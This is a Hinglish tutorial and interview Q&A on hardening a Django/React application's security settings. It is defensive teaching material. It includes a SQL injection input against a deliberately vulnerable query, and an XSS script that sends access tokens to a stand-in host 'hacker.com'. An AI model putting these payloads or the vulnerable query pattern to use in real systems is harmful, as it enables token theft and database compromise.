# Day 23: Security and Environment Hardening 🛡️

## 📌 Context & Concept Summary
Bhai, kitna bhi sundar app ho, agar API Keys leak ho gayi ya SQL Injection se DB wiped out ho gaya to pura project destroyed. Is module me humne SkillForge AI application ko Production Security Standards ke mutabiq harden kiya.

---

## 🛠️ Security Architecture Pillars

1. **Environment Isolation**: Production Secrets (`SECRET_KEY`, `GEMINI_API_KEY`, `SUPABASE_DB_URL`) ko `.env` file me encapsulate karke `.gitignore` me force add kiya.
2. **CORS (Cross-Origin Resource Sharing)**: `django-cors-headers` se strict trusted origins (`ALLOWED_HOSTS` & `CORS_ALLOWED_ORIGINS`) map kiye.
3. **SQL Injection Defense**: Django ORM Parameterized SQL queries automatically SQL injection attacks neutralize kar deti hain.
4. **XSS & Content Security**: Input sanitization & Django CSRF / JWT headers enforcement.

---

## 💻 Environment Setup (`settings.py`)
```python
import os
from dotenv import load_dotenv
load_dotenv()

SECRET_KEY = os.getenv('SECRET_KEY')
DEBUG = os.getenv('DEBUG', 'False') == 'True'
ALLOWED_HOSTS = os.getenv('ALLOWED_HOSTS', 'localhost,127.0.0.1').split(',')

CORS_ALLOWED_ORIGINS = [
    "http://localhost:5173",
    "http://127.0.0.1:5173",
]

# Security Headers for HTTPS
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
```

---

## ❓ 10 In-Depth Technical Interview Questions & Answers

### Q1: `.env` file Environment Isolation Security Git repositories me Public API Key leaks ko kaise Defeat karti hai?
**Detailed Answer (Bhai Language):** 
Attacker automated scanner bots (`trufflehog`, `git-leaks`) public GitHub repos ko 24/7 scan karte rehte hain for hardcoded keys (`AIzaSy...`, `sk-...`).
`.gitignore` file me `.env` explicitly specify karne se `.env` file local machine par isolated rehti hai aur Git Commit Graph me kabi include nahi hoti. Environment variables production servers par Secret Management Systems (AWS Secrets Manager / Vercel Env Secrets) ke through dynamically inject hoti hain.

---

### Q2: Django ORM SQL Injection (SQLi) Attacks ko Engine Level par Completely Neutralize kaise kar deta hai?
**Detailed Answer (Bhai Language):** 
Raw Vulnerable Query Concatenation:
```python
# ❌ VULNERABLE: Attacker inputs username = "' OR '1'='1"
cursor.execute(f"SELECT * FROM users WHERE username = '{username}'") 
# Resulting SQL: SELECT * FROM users WHERE username = '' OR '1'='1' (Bypasses authentication!)
```
Django ORM **Parameterized Prepared Statements** use karta hai:
```python
# ✅ SECURE ORM
UserProfile.objects.filter(user__username=username)
# Resulting SQL: SELECT * FROM users WHERE username = %s; Parameters: ("' OR '1'='1",)
```
Database engine input payload ko plain literal text string treat karta hai, preventing arbitrary SQL command execution!

---

### Q3: Cross-Origin Resource Sharing (CORS) Preflight `OPTIONS` Requests Security Handshake Flow?
**Detailed Answer (Bhai Language):** 
Jab Browser React App (`http://localhost:5173`) se Django API (`http://localhost:8000`) par custom headers (`Authorization: Bearer ...`, `Content-Type: application/json`) ke saath request bhejta hai:
1. Browser Client actual `POST/GET` request se pehle automatic lightweight `OPTIONS` request dispatch karta hai.
2. Django `django-cors-headers` middleware inspects `Origin: http://localhost:5173`.
3. If origin matches `CORS_ALLOWED_ORIGINS`, server responds `Access-Control-Allow-Origin: http://localhost:5173` along with permitted HTTP methods.
4. Browser validation success hone par actual payload request dispatch hone deta hai.

---

### Q4: Cross-Site Scripting (XSS) Vulnerabilities Client Browser Tokens Steal kaise karti hain aur Modern Frameworks Isko Defense kaise karte hain?
**Detailed Answer (Bhai Language):** 
XSS attack me attacker malicious JavaScript (`<script>fetch('http://hacker.com/steal?c='+localStorage.getItem('access_token'))</script>`) user comments ya input inputs me inject karta hai.
React JSX Engine automatically output data render karne se pehle HTML Entity Escaping (`<` -> `&lt;`, `>` -> `&gt;`) perform karta hai, converting executable script into safe plain text.

---

### Q5: CSRF (Cross-Site Request Forgery) Attacks Bearer Token Authentication APIs par Apply kyu nahi hote?
**Detailed Answer (Bhai Language):** 
CSRF attack browser ke automatic cookie attachment behavior (Session Cookies) target karta hai.
Bearer Token Authentication me React application `Authorization: Bearer <token>` header explicit JS code ke through pass karti hai. Malicious third-party websites (Clickjacking link) client request header inject nahi kar sakti kyunki unke paas JavaScript access allowed nahi hoti!

---

### Q6: `DEBUG = True` Production Environment me leave karne se Critical Information Disclosure Exploits kaise open hote hain?
**Detailed Answer (Bhai Language):** 
Production me `DEBUG = True` hone par uncaught exception standard error page ki jagah full Technical Stack Trace display kar deta hai, exposing:
1. Full Python Code File absolute paths (`/Users/dev/project/...`).
2. Exact Database Usernames, Host Names, and Table Structures.
3. Internal Environment Variables & Active Local Variables.
Attackers is information ka use karke infrastructure target exploits construct kar pate hain.

---

### Q7: `X-Content-Type-Options: nosniff` Security Header MIME-Type Sniffing Attacks ko kaise block karta hai?
**Detailed Answer (Bhai Language):** 
Without `nosniff`, agar application text/user upload asset return karti hai, browser asset content inspect karke type guess karne ki koshish karta hai. If file contains JavaScript syntax, browser user-uploaded `.txt` file ko JS script execute kar sakta hai. `nosniff` header browser ko strictly declared Content-Type header follow karne me bound kar deta hai.

---

### Q8: Clickjacking Attack kya hota hai aur `X-Frame-Options: DENY` isey Block kaise karta hai?
**Detailed Answer (Bhai Language):** 
Clickjacking me attacker kisi victim website ko transparent `<iframe>` me wrap karke apni malicious site par overlap kar deta hai. User click attacker site par karta hai par request victim account par execute ho jaati hai (e.g. Delete Account button). `X-Frame-Options: DENY` browser ko application kisi third-party iframe me render hone se completely restrict kar deta hai.

---

### Q9: Database Password Storage Encryption PBKDF2 with SHA256 Salt Architecture breakdown?
**Detailed Answer (Bhai Language):** 
Django plain passwords store nahi karta. Password storage formula:
$$\text{Hash} = \text{PBKDF2}_{\text{SHA256}}(\text{Password}, \text{Salt}, \text{Iterations}=600,000)$$
Each user receives a unique cryptographically random **Salt** string. Database leak hone par bhi Rainbow Table pre-computed attacks and reverse lookups brute force computationally impossible hote hain.

---

### Q10: Rate Limiting & Throttling Infrastructure DDoS & Password Brute-Force Attacks ko Defense kaise karti hai?
**Detailed Answer (Bhai Language):** 
Django REST Framework `ScopedRateThrottle` IP & User Identifiers monitor karta hai.
If IP address attempts 10 failed login requests in 30 seconds, server counter threshold breach hone par HTTP `429 Too Many Requests` status code with `Retry-After: 60` header return kar deta hai, protecting CPU and DB resources.
